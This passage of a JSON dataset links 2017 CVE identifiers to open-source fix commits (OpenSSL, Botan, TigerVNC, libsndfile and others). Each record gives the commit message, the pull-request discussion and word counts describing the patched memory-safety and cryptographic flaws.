            "commit_msg": "Fix buffer overflow if NULL line is present in db.\n\nIf ptr->line == NULL for an entry, the first cycle will exit,\nbut the second one will happily write past entries buffer.\nWe actually do not want to exit the first cycle prematurely\non ptr->line == NULL.\nSigned-off-by: Tomas Mraz <tmraz@fedoraproject.org>",
            "commit_msg_words": 51,
            "other_info": "Fix buffer overflow if NULL line is present in db. Thanks. Use CVE-2017-12424.",
            "pr_title_words": 10,
            "comments_words": 3,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2017-14737",
            "commit_url": "https://github.com/randombit/botan/commit/a3c4ec54ba8f611e7ef41867a4ed0fd669ef8057",
            "commit_msg": "Use a side channel silent table look up in the Montgomery exponentiation",
            "commit_msg_words": 12,
            "other_info": "Use a side channel silent table look up in the Montgomery exponentiation # [Codecov](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=h1) Report\n> Merging [#1224](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=desc) into [master](https://codecov.io/gh/randombit/botan/commit/549c4dcc4116f3947e47f613781c0441ae499c1a?src=pr&el=desc) will **increase** coverage by `0.02%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/randombit/botan/pull/1224/graphs/tree.svg?width=650&height=150&token=VR6iYmSPH8&src=pr)](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master    #1224      +/-   ##\n==========================================\n+ Coverage    92.2%   92.22%   +0.02%     \n==========================================\n  Files         749      749              \n  Lines       44914    44932      +18     \n  Branches     5185     5187       +2     \n==========================================\n+ Hits        41413    41440      +27     \n+ Misses       3467     3458       -9     \n  Partials       34       34\n```\n\n\n| [Impacted Files](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/lib/math/bigint/bigint.h](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree#diff-c3JjL2xpYi9tYXRoL2JpZ2ludC9iaWdpbnQuaA==) | `96.36% <\u00f8> (\u00f8)` | :arrow_up: |\n| [src/lib/math/numbertheory/powm\\_mnt.cpp](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree#diff-c3JjL2xpYi9tYXRoL251bWJlcnRoZW9yeS9wb3dtX21udC5jcHA=) | `98.14% <100%> (+0.18%)` | :arrow_up: |\n| [src/lib/math/mp/mp\\_karat.cpp](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree#diff-c3JjL2xpYi9tYXRoL21wL21wX2thcmF0LmNwcA==) | `98.66% <100%> (-0.01%)` | :arrow_down: |\n| [src/lib/math/mp/mp\\_monty.cpp](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree#diff-c3JjL2xpYi9tYXRoL21wL21wX21vbnR5LmNwcA==) | `100% <100%> (\u00f8)` | :arrow_up: |\n| [src/lib/math/bigint/bigint.cpp](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree#diff-c3JjL2xpYi9tYXRoL2JpZ2ludC9iaWdpbnQuY3Bw) | `97.84% <100%> (+0.24%)` | :arrow_up: |\n| [src/lib/pk\\_pad/emsa\\_raw/emsa\\_raw.cpp](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree#diff-c3JjL2xpYi9wa19wYWQvZW1zYV9yYXcvZW1zYV9yYXcuY3Bw) | `71.87% <0%> (-3.13%)` | :arrow_down: |\n| [src/lib/pubkey/mce/mceliece\\_key.cpp](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree#diff-c3JjL2xpYi9wdWJrZXkvbWNlL21jZWxpZWNlX2tleS5jcHA=) | `83.64% <0%> (-1.26%)` | :arrow_down: |\n| [src/lib/tls/tls\\_handshake\\_state.cpp](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree#diff-c3JjL2xpYi90bHMvdGxzX2hhbmRzaGFrZV9zdGF0ZS5jcHA=) | `83.33% <0%> (-0.46%)` | :arrow_down: |\n| [src/lib/tls/tls\\_channel.cpp](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree#diff-c3JjL2xpYi90bHMvdGxzX2NoYW5uZWwuY3Bw) | `79.1% <0%> (-0.35%)` | :arrow_down: |\n| [src/tests/unit\\_tls.cpp](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree#diff-c3JjL3Rlc3RzL3VuaXRfdGxzLmNwcA==) | `91.33% <0%> (-0.22%)` | :arrow_down: |\n| ... and [6 more](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=tree-more) | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=footer). Last update [549c4dc...2718c02](https://codecov.io/gh/randombit/botan/pull/1224?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n Sorry, I don't have time to look into it this time. Oh, sorry for the slow response. I am not sure I would be helpful here (it is quite out of my competence) and currently have not that much time ...",
            "pr_title_words": 12,
            "comments_words": 254,
            "total_other_info_words": 266
        },
        {
            "cve-id": "CVE-2017-3731",
            "commit_url": "https://github.com/openssl/openssl/commit/00d965474b22b54e4275232bc71ee0c699c5cd21",
            "commit_msg": "crypto/evp: harden AEAD ciphers.\n\nOriginally a crash in 32-bit build was reported CHACHA20-POLY1305\ncipher. The crash is triggered by truncated packet and is result\nof excessive hashing to the edge of accessible memory. Since hash\noperation is read-only it is not considered to be exploitable\nbeyond a DoS condition. Other ciphers were hardened.\n\nThanks to Robert \u015awi\u0119cki for report.\n\nCVE-2017-3731\n\nReviewed-by: Rich Salz <rsalz@openssl.org>",
            "commit_msg_words": 64,
            "other_info": "Open ssl 1 1 0 stable Fixed the above nits, and removed ifdefs for OPENSSL_NO_SERVERINFO.\n\nRegarding the FIXME in ssl_rsa.c: it would be possible to do extra checking for known types, like SignedCertificateTimestamps, but you could probably do that more easily than me.\n\nNote that OPENSSL_NO_TLSEXT doesn't actually compile (not the fault of this patch), and the 5878 authz code is still left in.  These things should probably change, I'd be happy to work on them after this gets in. \n Merged, with modifications.",
            "pr_title_words": 6,
            "comments_words": 77,
            "total_other_info_words": 83
        },
        {
            "cve-id": "CVE-2017-1000412",
            "commit_url": "https://github.com/OP-TEE/optee_os/commit/2421876859008ac498de722511f3b105b496ac56",
            "commit_msg": "libmpa: Implement Montgomery ladder\n\nThe mpa_exp_mod() function implements a LtoR algorithm. The LtoR\nalgorithm is sensitive to timing attacks since it leaks information\nabout the exponent since it's doing a different amount of work in each\nloop when doing the modular exponentiation. It will always do a square\nin each loop, but it will also do an additional multiply when the\nexponent bit k=1.\n\nThis patch implements the Montgomery ladder (and thereby replaces the\nold LtoR implementation), which always does the same amount of\noperations in each loop and thereby make it more robust to timing\nattacks.\n\nFixes: OP-TEE-2016-0002 which was reported by Applus+ Laboratories.\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nAcked-by: Jerome Forissier <jerome.forissier@linaro.org>\nAcked-by: Jens Wiklander <jens.wiklander@linaro.org>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>\nTested-by: Jerome Forissier <jerome.forissier@linaro.org> (HiKey, GP)\nTested-by: Etienne Carriere <etienne.carriere@linaro.org> (b2260, GP)",
            "commit_msg_words": 133,
            "other_info": "Rsa for 2.5.0 Thanks for creating the PR. I have 2 questions:\r\n\r\n- Do we have CVE numbers for the security fixes? If we do, the numbers should be in the commit description, but if we don't it shouldn't stop us from merging the patches of course.\r\n\r\n- The checkpatch warnings look easy enough to fix (long lines), can you address this please?\r\n > Do we have CVE numbers for the security fixes? If we do, the numbers should be in the commit description, but if we don't it shouldn't stop us from merging the patches of course.\r\n\r\nI've requested CVE's using [this](http://iwantacve.org) (it's actually quite a while ago), but I haven't got them yet. Compared to the first time, we got asked to accept a some legal stuff, which Rob Booth approved and I gave the information to them. But checking [this](https://github.com/distributedweaknessfiling/DWF-Legal-Acceptance/tree/master/Terms-Of-Use) page I still cannot find my own email address there. I can try to get hold of the Mitre people, but I don't think we will get any CVE's in time for the release. Instead I suggest that we update out [Security Advisories](https://www.op-tee.org/security-advisories) page instead when we've actually got the CVE's.\r\n\r\n> The checkpatch warnings look easy enough to fix (long lines), can you address this please?\r\n\r\nOf course, I will fix those.\r\n @jbech-linaro sounds good to me, thanks! All good, I think you can squash the fixup into the original patch and I'll merge everything. Squashed, rebased and tag(s) applied (should be) ready for merge! Thanks!\r\n\r\n(After rebasing to latest this morning I \"Re-tested\" with xtest -l 15 on `fe685824  msg_param.h: add `const` qualifier for read-only functions`, but when done I could see another commit has been merged from Etienne). Merged, thanks.\r\n\r\n> when done I could see another commit has been merged from Etienne\r\n\r\nIt's OK. Now I use the \"rebase and merge\" button to merge the PRs into master, so rebasing to the very latest is not required. > It's OK. Now I use the \"rebase and merge\" button to merge the PRs into master, so rebasing to the very latest is not required.\r\n\r\nThanks Jerome! I did rebase it on Etienne's patch, but I didn't test on his patch! But ... I hardly suspect it will matter. Yeah, the \"rebase and merge\" is pretty nifty!",
            "pr_title_words": 3,
            "comments_words": 379,
            "total_other_info_words": 382
        },
        {
            "cve-id": "CVE-2017-6802",
            "commit_url": "https://github.com/Yeraze/ytnef/commit/22f8346c8d4f0020a40d9f258fdb3bfc097359cc",
            "commit_msg": "Added safety check for Compressed RTF Streams\n\nYou could potentially overflow the input pointer.\n\nin response to #34",
            "commit_msg_words": 18,
            "other_info": "BugFix - data length error The long -> int change looks reasonable to me, but I don't consider my C knowledge to be too good to actually act as a reviewer ;) \r\n\r\nWhat I do notice is the lack of warning reporting in general. You should use -Wall at the very least. In Debian I actually add -Wextra as well and the result is... interesting. Fedora has patches to silence all of these.  I do that myself regularly as a first-step static analysis (and I run cppcheck regularly).  All I see is some rather harmless 'unused parameters' and 'comparing int & unsigned int' warnings, nothing I consider too harmful.\r\n\r\nAre you seeing something more serious? Finally, these two new issues could probably get additional CVE numbers. I requested the others for you and can do these two as well, but you can do it using the mitre web form at https://cveform.mitre.org/ Re: warnings, no. It's just I'm unused to seeing a project not using at least -Wall. I'm unsure if any of them are actually potentially dangerous or can cause problems.",
            "pr_title_words": 5,
            "comments_words": 176,
            "total_other_info_words": 181
        },
        {
            "cve-id": "CVE-2017-10671",
            "commit_url": "https://github.com/blueness/sthttpd/commit/c0dc63a49d8605649f1d8e4a96c9b468b0bff660",
            "commit_msg": "Fix heap buffer overflow in de_dotdot",
            "commit_msg_words": 6,
            "other_info": "Fix heap buffer overflow in de_dotdot looks good to me Just for reference, this vulnerability is CVE-2017-10671, correct? Yes, this is CVE-2017-10671",
            "pr_title_words": 6,
            "comments_words": 16,
            "total_other_info_words": 22
        },
        {
            "cve-id": "CVE-2017-7396",
            "commit_url": "https://github.com/TigerVNC/tigervnc/commit/dccb5f7d776e93863ae10bbff56a45c523c6eeb0",
            "commit_msg": "Prevent leak of SecurityServer and ClientServer.\n\nThey are created in SConnection's and CConnection's constructors but never destroyed.\n\nThere is no reason for the indirection, so lets make them direct members.",
            "commit_msg_words": 30,
            "other_info": "Fixes This is CVE-2017-7395 and CVE-2017-7396 .\r\n\r\nSpecifically CVE-2017-7395 is assigned for https://github.com/TigerVNC/tigervnc/pull/436/commits/bf3bdac082978ca32895a4b6a123016094905689 and CVE-2017-7396 for https://github.com/TigerVNC/tigervnc/pull/436/commits/dccb5f7d776e93863ae10bbff56a45c523c6eeb0",
            "pr_title_words": 1,
            "comments_words": 16,
            "total_other_info_words": 17
        },
        {
            "cve-id": "CVE-2017-11466",
            "commit_url": "https://github.com/dotCMS/core/commit/ab2bb2e00b841d131b8734227f9106e3ac31bb99",
            "commit_msg": "#12131 fixes arbitrary upload (#12134)\n\n* #12131 fixes arbitrary upload\r\n\r\n* #12131 fixes jenkins feedback",
            "commit_msg_words": 15,
            "other_info": "#12131 fixes arbitrary upload SonarQube analysis reported 5 issues\n* ![MINOR][MINOR] 4 minor\n* ![INFO][INFO] 1 info\n\nWatch the comments in this conversation to review them.\n\n#### 1 extra issue\n\nNote: The following issues were found on lines that were not modified in the pull request. Because these issues can't be reported as line comments, they are summarized here:\n\n1. ![MINOR][MINOR] [CMSFilter.java#L35](https://github.com/dotCMS/core/blob/150d85278c9b7738c79a25616c0d2ff690855c51/dotCMS/src/main/java/com/dotmarketing/filters/CMSFilter.java#L35): Remove this unused import 'com.dotmarketing.db.HibernateUtil'. [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonarcloud.io/coding_rules#rule_key=squid%3AUselessImportCheck)\n\n[INFO]: https://sonarsource.github.io/sonar-github/severity-info.png 'Severity: INFO'\n[MINOR]: https://sonarsource.github.io/sonar-github/severity-minor.png 'Severity: MINOR'",
            "pr_title_words": 4,
            "comments_words": 72,
            "total_other_info_words": 76
        },
        {
            "cve-id": "CVE-2017-14501",
            "commit_url": "https://github.com/libarchive/libarchive/commit/f9569c086ff29259c73790db9cbf39fe8fb9d862",
            "commit_msg": "iso9660: validate directory record length",
            "commit_msg_words": 5,
            "other_info": "iso9660: validate directory record length",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2017-7392",
            "commit_url": "https://github.com/TigerVNC/tigervnc/commit/8f3e8663b3cf57c0b62d939d6953fbfcc112aadd",
            "commit_msg": "Delete underlying ssecurity in SSecurityVeNCrypt.\n\nOtherwise it gets leaked which would allow even not authenticated clients to exhaust server memory.",
            "commit_msg_words": 20,
            "other_info": "Delete underlying ssecurity in SSecurityVeNCrypt. This has been assigned CVE-2017-7392",
            "pr_title_words": 5,
            "comments_words": 5,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2017-3735",
            "commit_url": "https://github.com/openssl/openssl/commit/068b963bb7afc57f5bdd723de0dd15e7795d5822",
            "commit_msg": "Avoid out-of-bounds read\n\nFixes CVE 2017-3735\n\nReviewed-by: Kurt Roeckx <kurt@roeckx.be>\n(Merged from https://github.com/openssl/openssl/pull/4276)\n\n(cherry picked from commit b23171744b01e473ebbfd6edad70c1c3825ffbcd)",
            "commit_msg_words": 18,
            "other_info": "Open ssl 1 1 0 stable Fixed the above nits, and removed ifdefs for OPENSSL_NO_SERVERINFO.\n\nRegarding the FIXME in ssl_rsa.c: it would be possible to do extra checking for known types, like SignedCertificateTimestamps, but you could probably do that more easily than me.\n\nNote that OPENSSL_NO_TLSEXT doesn't actually compile (not the fault of this patch), and the 5878 authz code is still left in.  These things should probably change, I'd be happy to work on them after this gets in. \n Merged, with modifications.",
            "pr_title_words": 6,
            "comments_words": 77,
            "total_other_info_words": 83
        },
        {
            "cve-id": "CVE-2017-16883",
            "commit_url": "https://github.com/libming/libming/commit/f3a66c6479d1191734b5ab57d5d7e0bd7525b1a7",
            "commit_msg": "Fix NULL pointer deref in outputSWF_TEXT_RECORD\n\nfip and fip_current are static pointers to a linked list containing\nfonts information. This list and the two pointers are initialized and\nfilled by saveFontInfo() (called by the outputSWF_DEFINEFONTxxxx()\nfunctions when defining new fonts).\n\nIn the case where no font is defined, saveFontInfo() is never called\nand the two list pointers are NULL.\n\nThis situation may trigger a NULL pointer dereference in\noutputSWF_TEXT_RECORD. In this patch, we check for !fip_current\nbefore dereferencing it. In the == NULL case, we print a warning and\ncontinue.\n\nThis commit addresses CVE-2017-16883 (fixes #77).",
            "commit_msg_words": 96,
            "other_info": "Fix NULL pointer dereference in outputSWF_TEXT_RECORD (CVE-2017-16883) Can you please add a NEWS entry too ?\n Oh, right, forgot it. Done. thank you",
            "pr_title_words": 7,
            "comments_words": 16,
            "total_other_info_words": 23
        },
        {
            "cve-id": "CVE-2017-5593",
            "commit_url": "https://github.com/psi-im/iris/commit/02e976d4426a1319a7af7d26d7aba9d8c6077570",
            "commit_msg": "Try to fix XMPP Client User Impersonation Vulnerability",
            "commit_msg_words": 8,
            "other_info": "Try to fix XMPP Client User Impersonation Vulnerability",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2017-1000209",
            "commit_url": "https://github.com/TakahikoKawasaki/nv-websocket-client/commit/feb9c8302757fd279f4cfc99cbcdfb6ee709402d",
            "commit_msg": "Verify that certificate is valid for server hostname\n\nWithout this change, the WebSocket library will accept\na trusted certificate issued for domain A when connecting\nto domain B. This could be exploited for Man-in-the-middle\nattacks.\n\nThe underlying issue is that Java considers hostname\nverification to be a part of HTTPS and as such, will\nnot perform it by default.\n\nThis change adds the default HostnameVerifier used\nby Android, which in recent versions is derived from\nOkHttp. Minor changes were made to make it build for\nJava 1.6.\n\nTested with and without a proxy configured.",
            "commit_msg_words": 94,
            "other_info": "Verify that certificate is valid for server hostname @TakahikoKawasaki A public test server that can be used to reliably reproduce this issue is available to you upon request.\r\n\r\n**Status with this change:**\r\n- **No proxy:** Working\r\n- **Standard HTTP proxy:** Working (verifies that hostname of the wss:// request matches certificate of the endpoint server)\r\n- **HTTPS proxy:** Untested (likely not working but I was unable to find a suitable proxy to test this with) @blunden Thank you very much. Apparently, you have much more knowledge about this field than I. @blunden Released nv-websocket-client version 2.2. `WebSocket.connect()` method throws `HostnameUnverifiedException` (a subclass of `WebSocketException`) when the certificate of the peer does not match the expected hostname. Thank you for your contribution. @TakahikoKawasaki Thanks for merging it.\r\n\r\nYou will likely need to add hostname verification of the proxy's certificate if it's an HTTPS proxy. Like I said above, I don't have any of those to test with so currently it won't verify the hostname of the proxy, which it really should. It would probably be a simple fix but the ProxyHandshaker or Address would have to be able to return whether the user specified an http or https proxy address. You could then just add an if-statement based on that and a similar hostname verification of mAddress.getHostname() (which I think will be the proxy hostname) inside it. It did not do it myself because I couldn't test it and didn't want to risk breaking it.",
            "pr_title_words": 8,
            "comments_words": 235,
            "total_other_info_words": 243
        },
        {
            "cve-id": "CVE-2017-11576",
            "commit_url": "https://github.com/fontforge/fontforge/commit/df349365630344ef3004a3c7934c7e7496692fb1",
            "commit_msg": "readcfftopdict: Prevent stack underflow condition\n\nCloses #3091",
            "commit_msg_words": 7,
            "other_info": "Fix a few cves Just in time. I'm cutting a release tomorrow. I'll review as soon as I get a chance.\r\n I made one inline comment/query. It otherwise looks fine.\r\n All good.",
            "pr_title_words": 4,
            "comments_words": 28,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2017-1000203",
            "commit_url": "https://github.com/root-project/root/commit/88ccff152604e0f1012653a596d802ff7ede3145",
            "commit_msg": "rootd: do not use popen() to expand path names (#513)\n\nAddressed security threat reported by S. Luders.\r\nUsing the same technology used in TSystem::ExpandFileName (with clang-format processing).",
            "commit_msg_words": 27,
            "other_info": "In rootd, do not use a call to popen() to expand path names Starting build on `centos7`/`gcc49`, `mac1011`/`native`, `slc6`/`gcc49`, `slc6`/`gcc62`, `ubuntu14`/`native` and CMake flags `-Dccache=ON -Dimt=OFF` @gganis Naive question. Why not to call TSystem::ExpandFileName from RootdExpandFileName instead of copying the code?  Because rootd is standalone (not a ROOT application in the strict sense) and it would have meant to link it with libCore.\nIt was the easiest mod, in the spirit of how rootd was initially written (there are other duplications).\n\n\n> On 19 Apr 2017, at 15:22, Pere Mato <notifications@github.com> wrote:\n> \n> @gganis <https://github.com/gganis> Naive question. Why not to call TSystem::ExpandFileName from RootdExpandFileName instead of copying the code?\n> \n> \u2014\n> You are receiving this because you were mentioned.\n> Reply to this email directly, view it on GitHub <https://github.com/root-project/root/pull/513#issuecomment-295268410>, or mute the thread <https://github.com/notifications/unsubscribe-auth/ABp52omh0rk8hcf5bNP-wBnsLknbEI7Yks5rxgqqgaJpZM4NBmka>.\n> \n\n OK. Thanks for the explanation. We could eventually statically link with the object files of libCore, but since is very obsolete does not make sense.  Could somebody merge that in? Maybe we should backport it to 6.08. Thanks @gganis",
            "pr_title_words": 13,
            "comments_words": 165,
            "total_other_info_words": 178
        },
        {
            "cve-id": "CVE-2017-1000472",
            "commit_url": "https://github.com/pocoproject/poco/commit/f5b2cf3dd6976ae53b2f3c9618b0087a0646cc7d",
            "commit_msg": "- fix Zip Decompress Parent Path Injection #1968 bug\n- add valid patch check test\n- add vulnearbility triggering zip archive and test\n- remove temporary test output files\n- if possible, redirect temporary file generation to temp directory or\n- delete temporary files after tests",
            "commit_msg_words": 46,
            "other_info": "Feature gradle",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2017-12562",
            "commit_url": "https://github.com/libsndfile/libsndfile/commit/b6a9d7e95888ffa77d8c75ce3f03e6c7165587cd",
            "commit_msg": "src/common.c: Fix heap buffer overflows when writing strings in binheader\n\nFixes the following problems:\n 1. Case 's' only enlarges the buffer by 16 bytes instead of size bytes.\n 2. psf_binheader_writef() enlarges the header buffer (if needed) prior to the\n    big switch statement by an amount (16 bytes) which is enough for all cases\n    where only a single value gets added. Cases 's', 'S', 'p' however\n    additionally write an arbitrary length block of data and again enlarge the\n    buffer to the required amount. However, the required space calculation does\n    not take into account the size of the length field which gets output before\n    the data.\n 3. Buffer size requirement calculation in case 'S' does not account for the\n    padding byte (\"size += (size & 1) ;\" happens after the calculation which\n    uses \"size\").\n 4. Case 'S' can overrun the header buffer by 1 byte when no padding is\n    involved\n    (\"memcpy (&(psf->header.ptr [psf->header.indx]), strptr, size + 1) ;\" while\n    the buffer is only guaranteed to have \"size\" space available).\n 5. \"psf->header.ptr [psf->header.indx] = 0 ;\" in case 'S' always writes 1 byte\n    beyond the space which is guaranteed to be allocated in the header buffer.\n 6. Case 's' can overrun the provided source string by 1 byte if padding is\n    involved (\"memcpy (&(psf->header.ptr [psf->header.indx]), strptr, size) ;\"\n    where \"size\" is \"strlen (strptr) + 1\" (which includes the 0 terminator,\n    plus optionally another 1 which is padding and not guaranteed to be\n    readable via the source string pointer).\n\nCloses: https://github.com/erikd/libsndfile/issues/292",
            "commit_msg_words": 247,
            "other_info": "src/common.c: Fix heap buffer overflows when writing strings in binheader",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2017-10788",
            "commit_url": "https://github.com/perl5-dbi/DBD-mysql/commit/18e348b57160bfb45da1a5051a3466c8c6635e49",
            "commit_msg": "Fix use-after-free after calling mysql_stmt_close()\n\nIgnore return value from mysql_stmt_close() and also its error message\nbecause it points to freed memory after mysql_stmt_close() was called.",
            "commit_msg_words": 25,
            "other_info": "Fix use-after-free after calling mysql_stmt_close()",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2017-9146",
            "commit_url": "https://github.com/Yeraze/ytnef/commit/c576639e7e6bd9c7de0a288b9f94590d34ac9215",
            "commit_msg": "resolves #47: invalid write in TNEFFillMapi\n\nDon't pass 0 to calloc",
            "commit_msg_words": 11,
            "other_info": "resolves #47: invalid write in TNEFFillMapi",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2017-8314",
            "commit_url": "https://github.com/xbmc/xbmc/commit/35cfe35608b15335ef21d798947fceab3f47c8d7",
            "commit_msg": "[filesystem] ZipManager: skip path traversal",
            "commit_msg_words": 5,
            "other_info": "[filesystem] ZipManager: skip path traversal updated to be equal with #12023 jenkins build this please jenkins build this please jenkins build this please Hello,\r\n\r\nis this already available here?\r\nhttps://kodi.tv/download\r\n\r\nI see it is in the milestone and from https://kodi.tv/download seems that 17.2 has been released also there.\r\n\r\nI just wanted to double check.\r\n(also it is all on all platforms right?) Ok I found the article here: https://kodi.tv/article/kodi-v172-minor-bug-fix-and-security-release\r\nThanks :D Hi,\r\n\r\nI will make a presentation about [Hacked in translation](http://blog.checkpoint.com/2017/05/23/hacked-in-translation/) at one of my computer science courses. I would like also to reproduce the bug with a zip file. Could any of you guys can help me out with a malicious zip file? @razvansalajan sorry for being harsh on you, but you should be able to make one yourself.",
            "pr_title_words": 5,
            "comments_words": 125,
            "total_other_info_words": 130
        },
        {
            "cve-id": "CVE-2017-11747",
            "commit_url": "https://github.com/tinyproxy/tinyproxy/commit/fe4d29888306e62f3bbf964b3fdb8126ddbe8f6e",
            "commit_msg": "Fix CVE-2017-11747: Create PID file before dropping privileges.\n\nResolves #106\n\nSigned-off-by: Michael Adam <obnox@samba.org>",
            "commit_msg_words": 14,
            "other_info": "Fix CVE-2017-11747: Create PID file before dropping privileges. merged via CLI. closing Did this commit ever make it into master? I'd like to be able to point people to the fix =) @orlitzky oh, gosh! I don't know what happened...\r\n\r\nI claimed to have pushed that with the CLI.\r\nBut it's not there :-(\r\n\r\nWill fix.... @orlitzky now you got it:\r\nhttps://github.com/tinyproxy/tinyproxy/commit/9acb0cb16cb65a554c5443f0409f827390379249\r\n\r\nhow embarrassing! still unclear how this happened... :-/ No big deal, shit happens, thank you! @orlitzky thanks for bringing it to our attention! \ud83e\udd47",
            "pr_title_words": 8,
            "comments_words": 78,
            "total_other_info_words": 86
        },
        {
            "cve-id": "CVE-2017-5617",
            "commit_url": "https://github.com/blackears/svgSalamander/commit/826555b0a3229b6cf4671fe4de7aa51b5946b63d",
            "commit_msg": "#11 - svgSalamander fix for CVE-2017-5617 was incomplete",
            "commit_msg_words": 8,
            "other_info": "#11 - svgSalamander fix for CVE-2017-5617 was incomplete",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2017-11571",
            "commit_url": "https://github.com/fontforge/fontforge/commit/5a0c6522682b0788fc478dd159dd6168cb5fa38b",
            "commit_msg": "parsettf.c: Fix buffer overflow condition when reading CFF top dictionary\n\nCloses #3087",
            "commit_msg_words": 12,
            "other_info": "Fix a few cves Just in time. I'm cutting a release tomorrow. I'll review as soon as I get a chance.\r\n I made one inline comment/query. It otherwise looks fine.\r\n All good.",
            "pr_title_words": 4,
            "comments_words": 28,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2017-16516",
            "commit_url": "https://github.com/brianmario/yajl-ruby/commit/a8ca8f476655adaa187eedc60bdc770fff3c51ce",
            "commit_msg": "Don't advance our end pointer until we've checked we have enough\nbuffer left and have peeked ahead to see that a unicode escape\nis approaching.\n\nThanks @kivikakk for helping me track down the actual bug here!",
            "commit_msg_words": 36,
            "other_info": "Fix potential bad read",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2017-14199",
            "commit_url": "https://github.com/zephyrproject-rtos/zephyr/commit/3953714a9b8508aca72ab93991e8468ba508aa4b",
            "commit_msg": "net: sockets: getaddrinfo() buffer overflow, etc. fixes\n\nThe existing implementation assumed DNS resolv callback will be\ncalled just once, but that's not always the case (apparently,\nfor multi-homes hosts or something). So, apply array bounds\nchecking (and do pointer arithmetic only after it, as the C\nstandard otherwise warns of \"undefined behavior\"). In such a case,\nthe port number wasn't set in each entry too, so rework how it's\ndone.\n\nThe issues discovered while resolving archive.ubuntu.com.\n\nSigned-off-by: Paul Sokolovsky <paul.sokolovsky@linaro.org>",
            "commit_msg_words": 80,
            "other_info": "net: sockets: getaddrinfo() buffer overflow, etc. fixes # [Codecov](https://codecov.io/gh/zephyrproject-rtos/zephyr/pull/6158?src=pr&el=h1) Report\n> Merging [#6158](https://codecov.io/gh/zephyrproject-rtos/zephyr/pull/6158?src=pr&el=desc) into [master](https://codecov.io/gh/zephyrproject-rtos/zephyr/commit/d0c2be7c8a22409507817f8206b4d631b7520bad?src=pr&el=desc) will **decrease** coverage by `<.01%`.\n> The diff coverage is `0%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/zephyrproject-rtos/zephyr/pull/6158/graphs/tree.svg?token=ftaqgO8OOj&width=650&height=150&src=pr)](https://codecov.io/gh/zephyrproject-rtos/zephyr/pull/6158?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master    #6158      +/-   ##\n==========================================\n- Coverage   52.88%   52.87%   -0.01%     \n==========================================\n  Files         412      412              \n  Lines       40274    40278       +4     \n  Branches     7801     7802       +1     \n==========================================\n  Hits        21297    21297              \n- Misses      15761    15765       +4     \n  Partials     3216     3216\n```\n\n\n| [Impacted Files](https://codecov.io/gh/zephyrproject-rtos/zephyr/pull/6158?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [subsys/net/lib/sockets/getaddrinfo.c](https://codecov.io/gh/zephyrproject-rtos/zephyr/pull/6158/diff?src=pr&el=tree#diff-c3Vic3lzL25ldC9saWIvc29ja2V0cy9nZXRhZGRyaW5mby5j) | `0% <0%> (\u00f8)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/zephyrproject-rtos/zephyr/pull/6158?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/zephyrproject-rtos/zephyr/pull/6158?src=pr&el=footer). Last update [d0c2be7...3953714](https://codecov.io/gh/zephyrproject-rtos/zephyr/pull/6158?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n > the pointer isn't even calculated if state->idx is out of bounds (it's undefined behavior);\r\n\r\nAre you sure that calculation is undefined behavior? Maybe accessing a pointer calculated in such a manner is undefined behavior?\r\n Yes, I'm sure. The only exception is calculating the pointer to one element past the end of an array (so it's possible to loop through an array using pointers rather than indices).\r\n\r\nSee the [C11 text](http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1548.pdf), 6.5.6.8:\r\n\r\n> If  both  the 